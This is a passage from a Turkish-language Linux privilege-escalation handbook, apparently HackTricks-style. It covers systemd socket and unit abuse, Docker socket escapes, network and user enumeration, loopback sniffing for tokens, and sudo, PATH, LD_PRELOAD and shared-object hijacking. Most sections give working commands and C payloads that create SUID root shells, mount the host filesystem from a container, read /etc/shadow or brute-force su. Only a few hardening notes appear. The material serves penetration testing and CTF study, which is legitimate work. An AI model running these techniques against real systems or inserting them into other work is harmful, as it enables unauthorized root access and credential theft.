- `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır; bunlar sırasıyla dinleme soketleri/FIFO'lar oluşturulup bağlanmadan **önce** veya **sonra** çalıştırılır. Komut satırının ilk token'i mutlak bir dosya adı olmalıdır, ardından işlem için argümanlar gelir.
- `ExecStopPre`, `ExecStopPost`: Dinleme soketleri/FIFO'lar kapatılıp kaldırılmadan **önce** veya **sonra** çalıştırılan ek **komutlar**dır.
- `Service`: Gelen trafikte **etkinleştirilecek** service unit adını belirtir. Bu ayar sadece `Accept=no` olan soketler için izinlidir. Varsayılan olarak soket ile aynı ada sahip olan service kullanılır (son eki değiştirilmiş olarak). Çoğu durumda bu seçeneği kullanmak gerekli değildir.

### Yazılabilir .socket dosyaları

Eğer bir **yazılabilir** `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir satır **ekleyebilirsiniz** ve backdoor soket oluşturulmadan önce çalıştırılacaktır. Bu yüzden **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekecektir.**\ _Sistemin o socket dosyası konfigürasyonunu kullanıyor olması gerekir, aksi halde backdoor çalıştırılmaz_

### Soket aktivasyonu + yazılabilir unit yolu (eksik service oluşturma)

Başka yüksek etkili bir yanlış yapılandırma:

- `Accept=no` ve `Service=<name>.service` olan bir socket unit
- referans verilen service unit eksik
- bir saldırgan `/etc/systemd/system` içine (veya başka bir unit arama yoluna) yazabiliyor

Bu durumda, saldırgan `<name>.service` oluşturabilir, ardından socket'e trafik tetikleyerek systemd'nin yeni servisi root olarak yükleyip çalıştırmasını sağlayabilir.

Kısa akış:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Writable sockets

Eğer **herhangi bir writable socket tespit ederseniz** (_burada config `.socket` dosyalarından değil Unix Sockets'ten bahsediyoruz_), o socket ile **iletişim kurabilirsiniz** ve belki bir zafiyeti exploit edebilirsiniz.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**İstismar örneği:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

HTTP isteklerini dinleyen bazı **sockets** olabileceğini unutmayın (_ .socket files değil; unix sockets olarak davranan dosyalardan bahsediyorum_). Bunu şu komutla kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Eğer socket **HTTP ile cevap veriyorsa**, onunla **iletişim kurabilir** ve belki bazı zafiyetleri **exploit** edebilirsiniz.

### Yazılabilir Docker Socket

Docker socket, genellikle `/var/run/docker.sock` konumunda bulunur ve korunması gereken kritik bir dosyadır. Varsayılan olarak, `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilir durumdadır. Bu sockete yazma erişimine sahip olmak privilege escalation'a yol açabilir. Aşağıda bunun nasıl yapılabileceği ve Docker CLI mevcut değilse alternatif yöntemler özetlenmiştir.

#### **Docker CLI ile Privilege Escalation**

Eğer Docker socket'e yazma erişiminiz varsa, aşağıdaki komutları kullanarak privilege escalation gerçekleştirebilirsiniz:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, host'un dosya sistemine root düzeyinde erişime sahip bir container çalıştırmanızı sağlar.

#### **Using Docker API Directly**

Docker CLI kullanılamıyorsa, Docker socket yine Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1.  **List Docker Images:** Kullanılabilir images listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Host sisteminin root dizinini mount eden bir container oluşturmak için bir istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan container'ı başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` kullanarak container ile bir bağlantı kurun; bu sayede içinde komut çalıştırabilirsiniz.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` bağlantısını kurduktan sonra, host'un dosya sistemine root düzeyinde erişimle doğrudan container içinde komut çalıştırabilirsiniz.

### Others

Dikkat: eğer docker socket üzerinde yazma izinleriniz varsa çünkü **inside the group `docker`** iseniz [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) bulabilirsiniz. Eğer [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Aşağıda **more ways to break out from docker or abuse it to escalate privileges** öğelerine göz atın:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Eğer **`ctr`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun; çünkü **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Eğer **`runc`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun; çünkü **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli şekilde etkileşim kurmasını ve veri paylaşmasını sağlayan gelişmiş bir inter-Process Communication (IPC) sistemidir. Modern Linux sistemi gözetilerek tasarlanmış olup, farklı uygulama iletişim biçimleri için sağlam bir çerçeve sunar.

Sistem çok yönlüdür; süreçler arası veri alışverişini geliştiren temel IPC'yi destekler ve **enhanced UNIX domain sockets**'ı andırır. Ayrıca olay veya sinyal yayınlamaya yardımcı olur, sistem bileşenleri arasında sorunsuz entegrasyon sağlar. Örneğin, gelen bir arama hakkında bir Bluetooth daemon'undan gelen sinyal, bir müzik oynatıcısını sessize almasını tetikleyebilir; bu da kullanıcı deneyimini iyileştirir. Ek olarak, D-Bus uzak nesne sistemini destekler; bu, uygulamalar arasında servis isteklerini ve metot çağrılarını basitleştirir ve geleneksel olarak karmaşık olan süreçleri sadeleştirir.

D-Bus, allow/deny modeline göre çalışır; eşleşen politika kurallarının kümülatif etkisine dayanarak mesaj izinlerini (metot çağrıları, sinyal yayımı vb.) yönetir. Bu politikalar, bus ile etkileşimleri belirler ve bu izinlerin sömürülmesi yoluyla potansiyel olarak privilege escalation'a izin verebilir.

Buna benzer bir politikanın bir örneği `/etc/dbus-1/system.d/wpa_supplicant.conf` içinde verilmiştir; bu örnek, root kullanıcısının `fi.w1.wpa_supplicant1` üzerinde sahiplik, gönderme ve alma izinlerini detaylandırır.

Belirli bir kullanıcı veya grup belirtilmemiş politikalar evrensel olarak uygulanır; "default" bağlamındaki politikalar ise diğer spesifik politikalar tarafından kapsanmayan tüm öğelere uygulanır.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus communication'ı burada enumerate ve exploit etmeyi öğrenin:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı enumerate etmek ve makinenin ağ içindeki konumunu tespit etmek her zaman ilginçtir.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Giden filtrelemede hızlı ön değerlendirme

Eğer host komut çalıştırabiliyor ancak callbacks başarısız oluyorsa, DNS, transport, proxy ve route filtrelemesini hızlıca ayırın:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Open ports

Erişmeden önce, daha önce etkileşim kuramadığınız makinede çalışan ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Dinleyicileri bind hedeflerine göre sınıflandırın:

- `0.0.0.0` / `[::]`: tüm yerel arayüzlerde erişilebilir.
- `127.0.0.1` / `::1`: yalnızca yerel (good tunnel/forward candidates).
- Belirli iç IP'ler (ör. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): genellikle yalnızca iç segmentlerden erişilebilir.

### Yalnızca yerel hizmet triyaj iş akışı

Bir host'u ele geçirdiğinizde, `127.0.0.1`'e bağlı hizmetler genellikle shell'inizden ilk kez erişilebilir hale gelir. Hızlı bir yerel iş akışı şunlardır:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS ağ tarayıcısı olarak (yalnızca ağ modu)

Yerel PE checks'lerine ek olarak, linPEAS odaklı bir ağ tarayıcısı olarak çalıştırılabilir. Mevcut ikili dosyaları `$PATH` içinde kullanır (genellikle `fping`, `ping`, `nc`, `ncat`) ve herhangi bir araç yüklemez.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
`-d`, `-p` veya `-i`'yi `-t` olmadan verirseniz, linPEAS saf bir ağ tarayıcısı gibi davranır (privilege-escalation kontrollerinin geri kalanını atlar).

### Sniffing

Trafiği sniff edip edemeyeceğinizi kontrol edin. Eğer yapabiliyorsanız, bazı credentials ele geçirebilirsiniz.
```
timeout 1 tcpdump
```
Hızlı pratik kontroller:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) post-exploitation sırasında özellikle değerlidir çünkü birçok yalnızca dahili servis tokens/cookies/credentials burada açığa çıkarır:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Şimdi yakala, sonra ayrıştır:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Kullanıcılar

### Genel Keşif

Kontrol edin **kim** olduğunuzu, hangi **ayrıcalıklara** sahip olduğunuzu, sistemde hangi **kullanıcıların** olduğunu, hangilerinin **giriş yapabildiğini** ve hangilerinin **root ayrıcalıklarına** sahip olduğunu:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Büyük UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların ayrıcalıklarını yükseltmesine izin veren bir hatadan etkilendi. Daha fazla bilgi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) ve [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Gruplar

root ayrıcalıkları verebilecek herhangi bir grubun **üyesi** olup olmadığınızı kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Pano

Mümkünse panonun içinde ilginç bir şey olup olmadığını kontrol edin.
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Eğer ortamın herhangi bir parolasını **biliyorsanız**, bu parolayı kullanarak **her kullanıcı olarak giriş yapmayı deneyin**.

### Su Brute

Eğer çok fazla gürültü çıkarma konusunda aldırış etmiyorsanız ve `su` ile `timeout` ikili dosyaları bilgisayarda mevcutsa, kullanıcıyı brute-force etmek için [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanmayı deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresi ile ayrıca kullanıcıları brute-force etmeye çalışır.

## Yazılabilir PATH istismarları

### $PATH

Eğer $PATH içindeki bir klasöre **yazabiliyorsanız** ayrıcalıkları, farklı bir kullanıcı (tercihen root) tarafından çalıştırılacak bir komutun adıyla yazılabilir klasörün içine **bir backdoor oluşturmak** suretiyle yükseltebilirsiniz; bunun işe yaraması için komutun $PATH'te yazılabilir klasörünüzden önce yer alan bir klasörden **yüklenmemesi** gerekir.

### SUDO and SUID

sudo kullanarak bazı komutları çalıştırmaya izinli olabilirsiniz veya dosyalarda suid biti setli olabilir. Bunu şu şekilde kontrol edin:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmedik komutlar dosyaları okuma ve/veya yazma veya hatta bir komut çalıştırma imkanı sağlar.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının başka bir kullanıcının ayrıcalıklarıyla parola bilmeden bazı komutları çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte kullanıcı `demo` `root` olarak `vim` çalıştırabiliyor; artık root directory'ne bir ssh anahtarı ekleyerek veya `sh` çağırarak bir shell elde etmek çok kolay.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge kullanıcıya bir şey çalıştırırken bir ortam değişkeni **ayarlama** olanağı tanır:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB machine Admirer'a dayanan**, script root olarak çalıştırılırken rastgele bir python kütüphanesini yüklemek için **PYTHONPATH hijacking**'e **savunmasızdı:**
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sudo env_keep aracılığıyla korunduğunda → root shell

Eğer sudoers `BASH_ENV`'i koruyorsa (ör. `Defaults env_keep+="ENV BASH_ENV"`), izin verilen bir komutu çağırırken Bash’in etkileşimli olmayan başlangıç davranışını kullanarak kök olarak keyfi kod çalıştırabilirsiniz.

- Neden işe yarar: Etkileşimli olmayan shell'lerde, Bash `$BASH_ENV`'i değerlendirir ve hedef script çalıştırılmadan önce o dosyayı source eder. Birçok sudo kuralı bir script'in veya bir shell wrapper'ın çalıştırılmasına izin verir. `BASH_ENV` sudo tarafından korunduysa, dosyanız root ayrıcalıklarıyla source edilir.

- Gereksinimler:
- Çalıştırabileceğiniz bir sudo kuralı (etkileşimli olmayan şekilde `/bin/bash` çağıran herhangi bir hedef veya herhangi bir bash script).
- `BASH_ENV`'in `env_keep` içinde olması (`sudo -l` ile kontrol edin).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Sertleştirme:
- `BASH_ENV` (ve `ENV`) öğesini `env_keep`'ten kaldırın, `env_reset`'i tercih edin.
- sudo-izinli komutlar için shell wrappers'dan kaçının; minimal binaries kullanın.
- `preserved env vars` kullanıldığında sudo I/O logging ve uyarıları değerlendirin.

### Terraform, sudo ile korunmuş HOME (!env_reset) üzerinden

Eğer sudo ortamı bozmadan bırakıyorsa (`!env_reset`) ve `terraform apply`'e izin veriyorsa, `$HOME` çağıran kullanıcıya ait olarak kalır. Bu nedenle Terraform root olarak **$HOME/.terraformrc** dosyasını yükler ve `provider_installation.dev_overrides`'ı uygular.

- Gerekli provider'ı yazılabilir bir dizine yönlendirin ve provider adıyla aynı olacak şekilde kötü amaçlı bir plugin bırakın (ör. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform, Go plugin handshake'ını başarısız kılar; ancak ölmeden önce payload'u root olarak çalıştırır ve geride bir SUID shell bırakır.

### TF_VAR overrides + symlink validation bypass

Terraform değişkenleri `TF_VAR_<name>` ortam değişkenleri aracılığıyla sağlanabilir; sudo ortamı koruduğunda bu değişkenler korunur. `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` gibi zayıf doğrulamalar symlink'lerle atlatılabilir:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform symlink'i çözer ve gerçek `/root/root.txt` dosyasını saldırganın okuyabileceği bir hedefe kopyalar. Aynı yaklaşım, hedef symlink'leri önceden oluşturarak (ör. provider’ın hedef yolunu `/etc/cron.d/` içine gösterecek şekilde) ayrıcalıklı yolların içine **yazmak** için kullanılabilir.

### requiretty / !requiretty

Bazı eski dağıtımlarda, sudo `requiretty` ile yapılandırılabilir; bu, sudo'nun yalnızca etkileşimli bir TTY'den çalıştırılmasını zorunlu kılar. Eğer `!requiretty` ayarlanmışsa (veya seçenek mevcut değilse), sudo reverse shells, cron jobs veya scripts gibi etkileşim gerektirmeyen bağlamlardan çalıştırılabilir.
```bash
Defaults !requiretty
```
Bu tek başına doğrudan bir güvenlik açığı olmasa da, sudo kurallarının tam bir PTY gerektirmeden kötüye kullanılabileceği durumları genişletir.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Eğer `sudo -l` çıktısında `env_keep+=PATH` veya saldırgan tarafından yazılabilir girdiler içeren bir `secure_path` (ör. `/home/<user>/bin`) görünüyorsa, sudo ile izin verilen hedef içindeki herhangi bir göreceli komut gölgelenebilir.

- Gereksinimler: genellikle `NOPASSWD` olan, mutlak yollar kullanılmadan (`free`, `df`, `ps`, vb.) komut çağıran bir script/binary çalıştıran bir sudo kuralı ve önce aranan yazılabilir bir PATH girdisi.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo yürütmesini atlatma yolları
**Atlayın** diğer dosyaları okumak için veya **symlinks** kullanın. Örneğin sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Bir **wildcard** kullanılırsa (\*), iş daha da kolaylaşır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary komut yolu olmadan

Eğer **sudo permission** tek bir komuta **komut yolu belirtilmeden** verilmişse: _hacker10 ALL= (root) less_ bunu PATH değişkenini değiştirerek istismar edebilirsiniz.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, bir **suid** binary **başka bir komutu yolunu belirtmeden çalıştırıyorsa (her zaman tuhaf bir SUID binary'nin içeriğini** _**strings**_ **ile kontrol edin)** de kullanılabilir.

[Payload examples to execute.](payloads-to-execute.md)

### Komut yolu olan SUID binary

Eğer **suid** binary **komutun yolunu belirterek başka bir komut çalıştırıyorsa**, o zaman suid dosyasının çağırdığı komutla aynı isimde bir **export a function** oluşturmaya çalışabilirsiniz.

Örneğin, eğer bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, fonksiyonu oluşturmayı ve export etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Daha sonra, suid binary'yi çağırdığınızda bu fonksiyon çalıştırılacaktır

### SUID wrapper tarafından yürütülen yazılabilir script

Yaygın bir özel uygulama yanlış yapılandırması, script'i çalıştıran root-owned SUID binary wrapper'ın olmasıdır; script'in kendisi ise low-priv users tarafından yazılabilir.

Tipik desen:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Eğer `/usr/local/bin/backup.sh` yazılabilir durumdaysa, payload komutları ekleyip SUID wrapper'ı çalıştırabilirsiniz:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Hızlı kontroller:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Bu saldırı yolu özellikle `/usr/local/bin` içine yerleştirilen "bakım"/"yedekleme" sarmalayıcılarında çok yaygındır.

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). Bu işleme kütüphane ön yükleme denir.

Ancak, sistem güvenliğini sağlamak ve bu özelliğin özellikle **suid/sgid** yürütülebilir dosyalar için kötüye kullanılmasını önlemek amacıyla, sistem bazı koşullar uygular:

- Gerçek kullanıcı kimliği (_ruid_) ile etkin kullanıcı kimliği (_euid_) eşleşmediğinde, loader **LD_PRELOAD**'i yok sayar.
- suid/sgid olan yürütülebilir dosyalar için, sadece standart yollar içinde yer alan ve ayrıca suid/sgid olan kütüphaneler ön-yüklenir.

Privilege escalation, `sudo` ile komut çalıştırma yeteneğiniz varsa ve `sudo -l` çıktısında **env_keep+=LD_PRELOAD** ifadesi varsa gerçekleşebilir. Bu yapılandırma, komutlar `sudo` ile çalıştırıldığında bile **LD_PRELOAD** ortam değişkeninin kalıcı olmasına ve tanınmasına izin verir; bu da potansiyel olarak arbitrary code'un elevated privileges ile yürütülmesine yol açabilir.
```
Defaults        env_keep += LD_PRELOAD
```
Kaydet: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Sonra **şu şekilde derleyin**:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **escalate privileges** çalıştırarak
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** env variable'ını kontrol ediyorsa suistimal edilebilir çünkü kütüphanelerin aranacağı yolu kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Alışılmadık görünen **SUID** izinlerine sahip bir binary ile karşılaşıldığında, **.so** dosyalarını düzgün şekilde yükleyip yüklemediğini kontrol etmek iyi bir uygulamadır. Bu, aşağıdaki komutu çalıştırarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hata ile karşılaşmak, exploitation için potansiyel olduğunu gösterir.

Bunu exploit etmek için, _"/path/to/.config/libcalc.c"_ gibi bir C dosyası oluşturup içine aşağıdaki kodu koyun:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu code, derlendikten ve çalıştırıldıktan sonra, dosya izinlerini değiştirerek ve yükseltilmiş ayrıcalıklara sahip bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını bir shared object (.so) file olarak şu komutla derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID ikili dosyasını çalıştırmak exploit'i tetiklemeli ve potansiyel olarak sistemin ele geçirilmesine yol açabilir.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Yazabileceğimiz bir klasörden library yükleyen bir SUID binary bulduğumuza göre, o klasöre gerekli isimle library'i oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Aşağıdaki gibi bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz kütüphanenin `a_function_name` adlı bir fonksiyon içermesi gerektiği anlamına gelir.

### GTFOBins

